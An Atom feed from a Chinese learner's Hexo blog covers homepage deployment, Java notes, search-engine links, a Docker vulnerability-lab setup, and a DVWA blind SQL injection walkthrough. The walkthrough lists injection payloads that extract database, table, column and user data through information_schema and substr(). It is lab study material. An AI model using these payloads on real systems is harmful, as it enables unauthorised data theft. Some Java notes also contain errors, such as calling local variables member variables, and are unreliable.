<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>理想青年</title>
  
  <subtitle>心有猛虎，细嗅蔷薇</subtitle>
  <link href="https://idealyth.github.io/blog/atom.xml" rel="self"/>
  
  <link href="https://idealyth.github.io/blog/"/>
  <updated>2025-01-03T05:44:08.000Z</updated>
  <id>https://idealyth.github.io/blog/</id>
  
  <author>
    <name>理想青年</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>给博客添加一个首页小记</title>
    <link href="https://idealyth.github.io/blog/posts/1183994362.html"/>
    <id>https://idealyth.github.io/blog/posts/1183994362.html</id>
    <published>2022-10-17T17:02:17.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为在网上看到一个好看的首页源码，所以心血来潮给自己博客也搞一个首页。因为没有学习过git命令和nodejs，所以这中间坑可没少经历。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>首先新建一个github仓库，名字叫blog。</p><p>在hexo根目录下的配置文件_config.yml，对url和root进行修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: https://idealyth.github.io/blog</span><br><span class="line">root: /blog/</span><br></pre></td></tr></table></figure><p>然后再把repository修改为blog仓库的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:IdealYth/blog.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>然后重新把博客部署到blog仓库</p><p><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></p><p>然后进入blog仓库，选择settings-pages，把分支选为main。</p><p><img                         lazyload                       alt="image"                       data-src="https://github.com/IdealYth/picx-images-hosting/raw/master/%E4%B8%BA%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E9%A6%96%E9%A1%B5/github-page%E9%85%8D%E7%BD%AE%E5%9B%BE.1ux4v7nd5qf4.webp"                        alt="github-page配置图"                 ></p><p>然后把主域名仓库里的文件进行删除。这边因为没学过git命令。不会删除github仓库的文件，虽然在网上也搜索了一下方法，试了试，后来觉得太麻烦，就直接把仓库删除了，重新建了一个仓库。</p><h2 id="配置首页"><a href="#配置首页" class="headerlink" title="配置首页"></a>配置首页</h2><p>然后下载首页的代码进行配置，执行下列命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Tomotoes/HomePage.git</span><br><span class="line">cd HomePage</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p>执行第三条命令的时候总是报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm ERR! code 1</span><br><span class="line">npm ERR! path D:\www\wegrow\node_modules\node-sass</span><br><span class="line">npm ERR! command failed</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>百度搜索了一下，应该是因为node版本太新，而安装的node-pass版本太老，网上给出的方法是把node版本降级，我觉得这样不太好，而且感觉很麻烦。</p><p>后来决定先安装package.json文件中的其余依赖项部分，把  “node-sass”: “^4.12.0”和”gulp-sass”: “^4.0.2”这两个包提取出来单独安装最新版。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i//其余的依赖部分</span><br><span class="line">npm install  --save  node-sass@7.0.3</span><br><span class="line">npm install  --save  gulp-sass@5.1.0</span><br></pre></td></tr></table></figure><p>然后运行npm run dev命令的时候，又出现了报错</p><p><img                         lazyload                       alt="image"                       data-src="https://github.com/IdealYth/picx-images-hosting/raw/master/%E4%B8%BA%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E9%A6%96%E9%A1%B5/%E6%8A%A5%E9%94%99%E5%9B%BE.4x1anmcy1no0.webp"                        alt="报错图"                 ></p><p>然后继续百度，原因是：新版本改了引入写法，同时新版本gulp sass不再自带默认的sass编译器，需要自己安装。</p><p>所以首先修改引入方法，对首页文件夹下的gulpfile.js进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将</span><br><span class="line">const sass = require(&#x27;gulp-sass&#x27;)</span><br><span class="line">改为</span><br><span class="line">const sass = require(&#x27;gulp-sass&#x27;)(require(&#x27;sass&#x27;))</span><br></pre></td></tr></table></figure><p>然后安装sass依赖包。</p><p><code>npm i sass -D</code></p><h2 id="修改首页内容"><a href="#修改首页内容" class="headerlink" title="修改首页内容"></a>修改首页内容</h2><p>打开首页文件夹下的config.json文件，对里面的相关内容进行修改，同时把头像和图标进行替换。</p><h2 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h2><p>在根目录下执行<code>npm run build</code> 后，会将项目文件生成到 <code>dist</code> 目录。</p><p>然后执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd dist</span><br><span class="line">git init </span><br><span class="line">git add -A</span><br><span class="line">git commit -am&quot;init&quot;</span><br><span class="line">git remote add origin https://github.com/你的用户名/你的用户名.github.io.git</span><br><span class="line">git push -f origin main</span><br></pre></td></tr></table></figure><p>然后在github上设置好首页仓库的GithubPage选项。</p><p>然后访问     <a href="https://idealyth.github.io/">https://idealyth.github.io</a>    就可以看到首页了。</p><p>博客链接：<a href="https://idealyth.github.io/blog">https://idealyth.github.io/blog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为在网上看到一个好看的首页源码，所以心血来潮给自己博客也搞一个首页。因为没有学习过git命令和nodejs，所以这中间坑可没少经历。&lt;/p</summary>
      
    
    
    
    <category term="网站建设" scheme="https://idealyth.github.io/blog/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="hexo" scheme="https://idealyth.github.io/blog/tags/hexo/"/>
    
    <category term="美化" scheme="https://idealyth.github.io/blog/tags/%E7%BE%8E%E5%8C%96/"/>
    
    <category term="网站" scheme="https://idealyth.github.io/blog/tags/%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>Java学习笔记</title>
    <link href="https://idealyth.github.io/blog/posts/2072697129.html"/>
    <id>https://idealyth.github.io/blog/posts/2072697129.html</id>
    <published>2022-10-15T18:53:45.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ol><li><p>首先ava源代码文件会通过编译会生成后缀为.class的字节码文件，然后java命令会先运行jvm虚拟机，然后JVM会去运行类加载器，默认从当前路径下寻找指定名字的class类文件，然后类加载器会将该文件装载到虚拟机，然后虚拟机启动解释器将该文件解释成二进制文件，然后计算机执行。</p></li><li><p>classpath变量如果设置了，类加载器只会从设置的路径下寻找class类，没有设置的话，默认从当前路径下寻找类</p></li><li><p>java命令后面跟名字（不包含后缀名），不能跟路径。</p></li><li><p>类体中是方法体，方法体中是一行一行的java语句，java语句必须由英文分号结尾。</p></li><li><p>在源文件中，只要有一个class的定义，那么就肯定会生成一个class文件</p></li><li><p>public的类可以没有，但如果有，public修饰的类名必须和源文件名保持一致。</p></li><li><p>在intelj中psvm可以快速输入main函数，输入sout可以快速输入System.out.println();</p></li><li><p>虽然java中的标识符严格区分大小写，但是一个java源文件中同时出现了：A类和a类，那么谁在前，就生成谁。所以说最好不要让类名相同。</p></li><li><p>命名规范：类名，接口名首字母大写，后面每个单词首字母大写，例：StudentTest</p><p>变量名，方法名首字母小写，后面每个单词首字母大写，例：studentTest</p><p>所有常量名全部大写，并且单词和单词之间用下划线衔接。</p></li><li><p>在方法体当中声明的变量叫成员变量，在方法体之外，类体内声明的变量叫成员变量。</p></li><li><p>println输出完信息会自动换行，print不会换行。</p></li><li><p><strong>基本数据类型4类8种</strong></p><p>(1)、<strong>整数型</strong> byte [1]、short[2] 、int[4] 、long[8]</p><p>(2)、<strong>浮点型</strong> float [4]、 double[8]</p><p>(3)、<strong>字符型</strong> char[2]，存放单个字符，如’a’、‘男’，单个字母占1个字节，单个汉字占2个字节</p><p>(4)、<strong>布尔型</strong> <a class="link"   href="https://so.csdn.net/so/search?q=boolean&spm=1001.2101.3001.7020" >boolean<i class="fas fa-external-link-alt"></i></a>[1]，存放true、false</p><p><strong>引用类型</strong><br>(1)、<strong>类</strong> class<br>(2)、<strong>接口</strong> interface<br>(3)、<strong>数组</strong> [ ]</p></li><li><p>(1), 基本数据类型 : 被创建时 , 在栈内存中会被划分出一定的内存 , 并将数值存储在该内存中 .</p><p>(2), 引用数据类型 : 被创建时 , 首先会在栈内存中分配一块空间 , 然后在堆内存中也会分配一块具体的空间用来</p><p>存储数据的具体信息 , 即 hash 值 , 然后由栈中引用指向堆中的对象地址 .</p></li><li><p>在Java中，整数型字面量默认是int类型。小容量会自动转换成大容量类型，这称作自动类型转换。<strong>byte&lt;short(char)&lt;int&lt;long&lt;float&lt;double</strong></p></li><li><p>强制类型转换就是把多余的字节给直接砍掉。例如：byte b &#x3D; （byte）300; &#x2F;&#x2F;b&#x3D;44</p><p>300这个int类型对应的二进制：00000000 00000000 00000001 00101100</p><p>byte占用一个字节，砍掉前三个字节，结果是00101100  (44)</p></li><li><p>当整数型字面量没有超过变量的取值范围，可以直接赋值。例如：byte b&#x3D;1；</p></li><li><p>byte,short,char做混合运算的时候，各自先转换成int型在做运算。例如：int a&#x3D;1；short x &#x3D; a;会报错，因为编译器只知道a是int类型，不知道他的值是多少。</p></li><li><p>多种数据类型做混合运算的时候，最终的类型是“最大容量”对应的类型；byte，short，char混合运算除外。</p></li><li><p>任意一个浮点型都比整数型空间大，例如：floa容量&gt;long容量。</p></li><li><p>逻辑运算符两边都必须是布尔类型。</p></li><li><p>&amp;&amp;和&amp;的区别？</p><p>&amp;&amp;短路与，若第一个条件为false，后面的条件直接跳过，结果为false<br>&amp;逻辑与，若第一个条件为false，后面的条件会执行，结果为false</p></li><li><p>使用扩展赋值运算符的时候，永远都不会改变运算结果类型。</p><p>x+&#x3D;1和x&#x3D;x+1本质上有不同：</p><p>x+&#x3D;1是自增一，x的数据类型不会发生改变。所有他等同于x &#x3D; (byte)(x+1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">byte x = 10；</span><br><span class="line">x = x+1；//会报错，因为编译器只知道x+1是int类型，不知道他的具体数值，所以int类型不能直接赋值给byte类型的变量。</span><br></pre></td></tr></table></figure></li><li><p>当+运算符两边任意一边是字符串类型的时候，那么这个+会进行字符串拼接操作</p></li><li><p>if语句只会执行一个分支</p></li><li><p>switch语句只支持int和是String类型，case语句可以合并。例如：case 1：case 2：</p></li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol><li>数组创建后没有赋值，会有默认值。</li></ol><p>int，short，byte，long是0；float，double是0.0；char是\u0000；boolean是false，String是null。</p><ol start="2"><li>基本数据类型赋值是值传递。</li></ol><p>数组在默认情况下是引用传递，赋的值默认是地址。所以把一个数组赋给另一个数组，改变任意一个数组的内容，两个都会改变。</p><ol start="3"><li><p>二维数组的每个元素都是一个一维数组。</p></li><li><p>二维数组列数可以不确定。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int arr[][] = new int[3][];//这个时候只是确定了一维数组的个数，但一维数组的地址都是null，就是每个一维数组都还没有开数据空间。</span><br><span class="line">arr[1] = new int[3];//然后可以这样给二维数组中的一维数组创建空间</span><br><span class="line">//在二维数组中，arr[]相当于一维数组空间的名字。而一维数组中，数据空间的名字是arr。</span><br></pre></td></tr></table></figure><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><ol><li><p>java内存的结构分析</p><p>栈：一般存放基本数据类型和局部变量</p><p>堆：存放对象和数组等，堆内存需要用关键字new才可以开辟。</p><p>方法区：常量池（常量，比如字符串），类加载信息</p><p><img                         lazyload                       alt="image"                       data-src="https://cdn.staticaly.com/gh/IdealYth/picx@main/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/java%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D.37f73sy1rcq0.webp"                        alt="java内存分配"                 ></p></li><li><p>对象（属性，行为）</p></li><li><p>类就是数据类型，对象就是一个具体的实例。</p></li><li><p>属性的定于语法通变量：访问修饰符 属性类型 属性名；有四种访问修饰符public proctected 默认类型 private。</p></li><li><p>属性如果不赋值，则默认值和数组的规则一致。</p></li></ol><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[修饰符列表] 返回值类型 方法名(形式参数列表)&#123;</span><br><span class="line">方法体;</span><br><span class="line">&#125;//修饰符列表不是必选的</span><br></pre></td></tr></table></figure><p>如果返回值类型不是void，那么方法体结束的时候必须使用return语句返回值。只要有return关键字的语句执行，当前方法必然结束。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本语法&quot;&gt;&lt;a href=&quot;#基本语法&quot; class=&quot;headerlink&quot; title=&quot;基本语法&quot;&gt;&lt;/a&gt;基本语法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;首先ava源代码文件会通过编译会生成后缀为.class的字节码文件，然后java命令会先运行jvm虚拟机，</summary>
      
    
    
    
    
    <category term="Java" scheme="https://idealyth.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>网络空间搜索引擎</title>
    <link href="https://idealyth.github.io/blog/posts/2473274679.html"/>
    <id>https://idealyth.github.io/blog/posts/2473274679.html</id>
    <published>2022-04-14T21:00:07.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>文章转载自:<a class="link"   href="http://example.com/2022/03/31/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" >APT-C-61团队<i class="fas fa-external-link-alt"></i></a></p><h2 id="鹰图平台："><a href="#鹰图平台：" class="headerlink" title="鹰图平台："></a>鹰图平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hunter.qianxin.com/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.46.06.png"                        alt="截屏2022-03-31 17.46.06"                 ></p><h2 id="Soall平台："><a href="#Soall平台：" class="headerlink" title="Soall平台："></a>Soall平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://soall.org/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.47.22.png"                        alt="截屏2022-03-31 17.47.22"                 ></p><h2 id="Shodan平台："><a href="#Shodan平台：" class="headerlink" title="Shodan平台："></a>Shodan平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.48.13.png"                        alt="截屏2022-03-31 17.48.13"                 ></p><h2 id="Censys平台："><a href="#Censys平台：" class="headerlink" title="Censys平台："></a>Censys平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://search.censys.io/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.48.53.png"                        alt="截屏2022-03-31 17.48.53"                 ></p><h2 id="钟馗之眼："><a href="#钟馗之眼：" class="headerlink" title="钟馗之眼："></a>钟馗之眼：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.49.41.png"                        alt="截屏2022-03-31 17.49.41"                 ></p><h2 id="onyphe平台："><a href="#onyphe平台：" class="headerlink" title="onyphe平台："></a>onyphe平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://onyphe.io/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.50.20.png"                        alt="img"                 ></p><h2 id="FOFA平台："><a href="#FOFA平台：" class="headerlink" title="FOFA平台："></a>FOFA平台：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.info/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.51.00.png"                        alt="截屏2022-03-31 17.51.00"                 ></p><h2 id="Fullhunt平台"><a href="#Fullhunt平台" class="headerlink" title="Fullhunt平台:"></a>Fullhunt平台:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fullhunt.io/</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2017.53.09.png"                        alt="截屏2022-03-31 17.53.09"                 ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章转载自:&lt;a class=&quot;link&quot;   href=&quot;http://example.com/2022/03/31/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/&quot; &gt;A</summary>
      
    
    
    
    <category term="web安全" scheme="https://idealyth.github.io/blog/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://idealyth.github.io/blog/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="搜索引擎" scheme="https://idealyth.github.io/blog/tags/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>dvwa中的sql盲注学习</title>
    <link href="https://idealyth.github.io/blog/posts/1718314811.html"/>
    <id>https://idealyth.github.io/blog/posts/1718314811.html</id>
    <published>2022-04-11T20:35:15.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始也没有思路，不知道怎么测试注入点，然后就是看到一位表哥的文章，这才理解。这里贴出来文章地址<a class="link"   href="https://www.cnblogs.com/chadlas/articles/15735045.html" >DVWA靶场通关—-(8) SQL Injection(Blind)教程 <i class="fas fa-external-link-alt"></i></a></p><h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.先输入1，页面返回正常。</span><br><span class="line"></span><br><span class="line">2.输入&quot; 1\ &quot; , 页面返回异常。</span><br><span class="line"></span><br><span class="line">3.输入“1&#x27;#”,页面返回正常。//这样来猜测参数的闭合方式</span><br></pre></td></tr></table></figure><p><strong>这里我刚开始用的and 1&#x3D;1#和1&#x3D;2#都返回不正常，后来才发现可能是因为“#”号没有url编码。</strong></p><p><strong>以下语句为了方便查看，都是未编码过的，但实际测试时候都经过编码(或者直接在输入框里输入语句，别再url上直接输入)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;=10#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=5#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=4#   //正常</span><br></pre></td></tr></table></figure><p>4.然后猜解表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">//这边然后直接用burp爆破，库名为dvwa</span><br></pre></td></tr></table></figure><p>5.判断数据库表的个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)&gt;=5#</span><br><span class="line">//有两张表</span><br></pre></td></tr></table></figure><p>6.猜解数据库表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br><span class="line">//表名users</span><br></pre></td></tr></table></figure><p>5.猜解字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure><p>6.猜解字段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select first_name from users limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure><h2 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2.Medium"></a>2.Medium</h2><p>查看代码，因为参数是下拉列表的，所以没有单引号，所以不需要闭合。还对一些特殊符号进行了过滤。因为是post型的，所以这里直接burp抓包，然后该数据。</p><p><strong>知识点：下拉列表的数字的这种形式，可能参数根本没有引号包裹，所以根本不需要想办法闭合什么的</strong></p><p>后面的就和low操作过程基本一样</p><h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>有limit来限制查询只能一条，这里直接用#给他砍掉，然后就是和low差不多了就。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;刚开始也没有思路，不知道怎么测试注入点，然后就是看到一位表哥的文章，这才理解。这里贴出来文章地址&lt;a class=&quot;link&quot;   href=&quot;https://www.cnblogs.com/chadlas/articles/15735045.html&quot; &gt;DVWA靶场通关</summary>
      
    
    
    
    <category term="web安全学习" scheme="https://idealyth.github.io/blog/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web安全" scheme="https://idealyth.github.io/blog/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="sql注入" scheme="https://idealyth.github.io/blog/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>docker的简单使用</title>
    <link href="https://idealyth.github.io/blog/posts/2481670560.html"/>
    <id>https://idealyth.github.io/blog/posts/2481670560.html</id>
    <published>2022-04-08T11:11:22.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker的简单使用"><a href="#Docker的简单使用" class="headerlink" title="Docker的简单使用"></a>Docker的简单使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#笔者以拉取 CVE-2017-7504 的漏洞环境为例。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker search testjboss    <span class="comment">#搜索漏洞环境</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker pull testjboss/jboss<span class="comment">#拉取漏洞环境</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -d -p 80:8080 testjboss/jboss:latest<span class="comment">#根据testjboss/jboss镜像创建并运行容器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ifconfig<span class="comment">#查看已运行容器ip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#kali中，使用浏览器访问http://IP#IP可为127.0.0.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker ps<span class="comment">#查看正在运行的容器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it e8f4844aabc1 /bin/bash<span class="comment">#进入容器(id:e8f4844aabc1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span><span class="comment">#退出容器到宿主机（容器不会停止运行）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker stop 3b41c0c08430<span class="comment">#关闭容器(id唯一标识，建议使用id)</span></span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://img-blog.csdnimg.cn/img_convert/9176b9ec8f7d22bdf0f0e2838873ed88.png"                        alt="img"                 ></p><p><img                         lazyload                       alt="image"                       data-src="https://img-blog.csdnimg.cn/img_convert/1f20269ee753e69960ee666220501912.png"                        alt="img"                 ></p><p><img                         lazyload                       alt="image"                       data-src="https://img-blog.csdnimg.cn/img_convert/97991a327e8d80847607ef4c6db40ce4.png"                        alt="img"                 ></p><p><img                         lazyload                       alt="image"                       data-src="https://img-blog.csdnimg.cn/img_convert/6c3d571ebf6c6a43c7a6a0b977007d8b.png"                        alt="img"                 ></p><h2 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#系统命令</span><br><span class="line">systemctl start docker#启动docker</span><br><span class="line">systemctl stop docker#停止docker</span><br><span class="line">systemctl restart docker#重启docker</span><br><span class="line">systemctl enable docker#设置docker开机自启</span><br><span class="line"></span><br><span class="line">#基本命令</span><br><span class="line">docker version#查看docker版本</span><br><span 